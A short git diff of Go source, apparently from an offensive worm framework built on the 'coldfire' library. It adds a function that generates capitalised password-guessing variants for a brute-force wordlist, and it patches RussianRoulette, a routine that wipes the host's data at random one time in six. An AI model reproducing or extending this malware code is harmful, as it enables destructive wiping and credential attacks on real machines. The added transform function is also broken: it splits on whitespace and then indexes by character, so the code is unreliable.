@@ -535,10 +535,21 @@ func WordCyryllicReplace(word string) []string {
 	return wordlist
 }
 
+func WordSingleUpperTransform(word string) []string {
+	res := []string{}
+	for i, _ := range word {
+		splitted := strings.Fields(word)
+		splitted[i] = strings.ToUpper(splitted[i])
+		res = append(res, strings.Join(splitted, ""))
+	}
+	return res
+}
+
 func RussianRoulette() error {
 	if coldfire.RandomInt(1, 6) == 6 {
 		return coldfire.Wipe()
 	}
+	return nil
 }
 
 //Returns transformed words from input slice
@@ -560,6 +571,7 @@ func NeuraxWordlist(words []string) []string {
 		if NeuraxConfig.ExpandWordlist {
 			wordlist = append(wordlist, WordEncapsule(word)...)
 			wordlist = append(wordlist, WordCyryllicReplace(word)...)
+			wordlist = append(wordlist, WordSingleUpperTransform(word)...)
 		}
 	}
 	return wordlist
